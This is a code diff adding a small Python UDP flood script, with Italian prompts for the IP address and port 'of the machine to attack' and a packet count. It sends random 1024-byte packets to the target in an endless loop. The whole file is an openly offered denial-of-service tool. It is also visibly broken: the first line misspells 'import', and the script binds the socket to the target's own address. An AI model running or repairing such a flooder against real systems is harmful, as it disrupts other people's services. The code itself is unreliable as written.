@@ -1,0 +1,17 @@
+mport socket
+import random
+
+target = input ("\n\nInserisci l'indirizzo IP della macchina da attaccare: ")
+
+port = int (input("\n\nInserisci la porta della macchina da attacare: "))
+
+n = int (input("\n\nInserisci quanti pacchetti UDP inviare: "))
+
+while 1:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.bind((target, port))
+        data= random.randbytes(1024)
+        addr= (str(target), int (port))
+        for x in range(n):
+                s.sendto(data,addr)
+        s.close() 
